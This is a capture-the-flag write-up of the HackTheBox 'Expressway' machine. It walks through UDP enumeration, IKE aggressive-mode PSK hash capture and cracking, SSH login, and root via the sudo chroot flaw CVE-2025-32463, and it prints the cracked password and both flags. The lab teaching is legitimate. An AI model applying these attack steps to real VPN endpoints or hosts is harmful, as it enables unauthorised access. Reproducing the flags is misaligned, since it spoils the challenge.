# Expressway

> Platform: HackTheBox
>
> Created by: [dakkmaddy](https://app.hackthebox.com/users/17571)
>
> Difficulty: Easy
>
> Status: Season 9

## Enumeration

First of all, we will begin with the **Nmap**. Actually, you can just use a normal Nmap command, but here is my preferences.
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Expressway]
└─$ nmap -sVSC <TARGET-IP> -T4 -Pn -n -vvv -oA expresswayscan
Nmap scan report for 10.10.11.87
Host is up, received user-set (0.072s latency).
Scanned at 2025-09-26 22:47:40 +08 for 3s
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

But, it looks like we did not get much information here. I tried to run rustscan to scan the udp ports:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Expressway]
└─$ rustscan -a 10.10.11.87 --ulimit 5000 --udp
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.87:500
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 22:50 +08
Initiating Ping Scan at 22:50
Scanning 10.10.11.87 [4 ports]
Completed Ping Scan at 22:50, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:50
Completed Parallel DNS resolution of 1 host. at 22:50, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 22:50
Scanning 10.10.11.87 [1 port]
Completed SYN Stealth Scan at 22:50, 0.04s elapsed (1 total ports)
Nmap scan report for 10.10.11.87
Host is up, received echo-reply ttl 63 (0.030s latency).
Scanned at 2025-09-26 22:50:42 +08 for 0s

PORT    STATE  SERVICE REASON
500/tcp closed isakmp  reset ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (68B)
```

From here, we get to know that the udp port 500 is opened, but what service is running on that port? Tried to run nmap with the to enumerate the service running on that port:
```
Nmap scan report for 10.10.11.87
Host is up, received user-set (0.035s latency).
Scanned at 2025-09-26 22:53:18 +08 for 127s

PORT    STATE SERVICE REASON              VERSION
500/udp open  isakmp? udp-response ttl 63
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:55
Completed NSE at 22:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:55
Completed NSE at 22:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:55
Completed NSE at 22:55, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Try to find ways how can we pentest this service port.

## Exploitation

From [Hacktricks website](https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting), we can use the <code>ike-scan</code> command to interact with the service:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Expressway]
└─$ ike-scan 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned HDR=(CKY-R=08ce9d0054c86242) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.047 seconds (21.40 hosts/sec).  1 returned handshake; 0 returned notify
```

Based on the response here, we get the <code>"1 returned handshake; 0 returned notify"</code>, which we can try to make a request using a fake id to see if there is hash given or not:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Expressway]
└─$ ike-scan 10.10.11.87 -M -A --id=groupnamedoesnotexist -P
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=a3c481027c46b43a)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
d10316a91e2d08db7dc009f9ad007b130c8a743ad8d052d8a658583822a530823b37934059431c6cff5dda33f6b11bbe2bf3a7609f01acb29983a49bca16b54a495a825901c911b6705c6d4a7d11014a40b2e2d06392c7d2f06c0ce2a55377fcdb7282583206202b846b86b64711b825eff94aa5a7ea78f2bced5de51846d4aa:19b6cc08d905e303ef0c513218bb94906b8f0d9f0178b10aca21dbb09691cdbbee9ddea7c1636ffb041d920c70ed97012429ddae6be11caa8e253aea16c982cd95fb29886c74d8e8c900b20b1ed63f07442e99b1c5043a622ac644e50b91f2cd28eb43ada4540c996907952ccd8963beaf5dcdb24235c861fdd3316557e952df:a3c481027c46b43a:d4830edc7fdb9994:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:26a7633b0a4e16521150c1e4da35ddb0f076323e:39b44e95d1d71837605547c671235c26334bebe7edde3d7ba0fbe9e340027b99:00a86870c2bffea7aaf96a4d10035935399f8116
Ending ike-scan 1.9.6: 1 hosts scanned in 0.071 seconds (14.05 hosts/sec).  1 returned handshake; 0 returned notify
```

Looks like we get the hash here. Now we can try to request using the correct id which is <code>ike@expressway.htb</code> and crack it:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Expressway]
└─$ ike-scan 10.10.11.87 -M -A --id=ike@expressway.htb --pskcrack=hash.txt
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=510b9b7e7305738f)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.044 seconds (22.92 hosts/sec).  1 returned handshake; 0 returned notify

┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Expressway]
└─$ psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt 
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash d203ab64c774de450f4fb8bbf05d756211b0babf
Ending psk-crack: 8045040 iterations in 8.807 seconds (913469.70 iterations/sec)
```

Now, we can try to gain our first initial foothold by SSH to the server:
```
┌──(kali㉿kali)-[/mnt/…/Learning/HackTheBox/Machines/Expressway]
└─$ ssh ike@10.10.11.87                                                
The authenticity of host '10.10.11.87 (10.10.11.87)' can't be established.
ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.87' (ED25519) to the list of known hosts.
ike@10.10.11.87's password: 
Last login: Fri Sep 26 15:42:26 BST 2025 from 10.10.14.112 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 26 15:46:57 2025 from 10.10.14.107
ike@expressway:~$
```

<details>
<summary><b>🏳️user.txt</b></summary>
<code><b>d553040a36674628930411fc4a74a203</b></code>
</details><br>


## Privilege Escalation

Moving on to **escalate our privileges to root**. We need to find what can we leverage to spawn a privilege shell.

First we try to check with the **sudo permission** first
```
ike@expressway:~$ sudo -l
Sorry, user ike may not run sudo on expressway.
```

I also tried uploading <code>linpeas</code> from my server to ease up the process.

In <code>SUID</code> section, looks like something interesting that we can use to get the root shell:
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                           
strace Not Found                                                                             
-rwsr-xr-x 1 root root 1.5M Aug 14 12:58 /usr/sbin/exim4                                     
-rwsr-xr-x 1 root root 1023K Aug 29 15:18 /usr/local/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                                              
-rwsr-xr-x 1 root root 116K Aug 26 22:05 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                   
-rwsr-xr-x 1 root root 75K Sep  9 10:09 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                               
-rwsr-xr-x 1 root root 87K Aug 26 22:05 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 91K Sep  9 10:09 /usr/bin/su
-rwsr-xr-x 1 root root 276K Jun 27  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                           ...
```

I also tried to confirm the sudo version to check if it having a recent CVE or not:
```
ike@expressway:/tmp$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

Looks like it is vulnerable to the recent [CVE-2025-32463](https://www.exploit-db.com/exploits/52352). So just follow the exploit steps and get to root:
```
...
ike@expressway:/tmp/sudowoot.stage.eFEzLy$ sudo -R woot woot
root@expressway:/# cat /root/root.txt
```

Read the root flag to complete the machine

<details>
<summary><b>🏳️root.txt</b></summary>
<code><b>ae2ff0fd4f8894357db0c93b07da3446</b></code>
</details><br>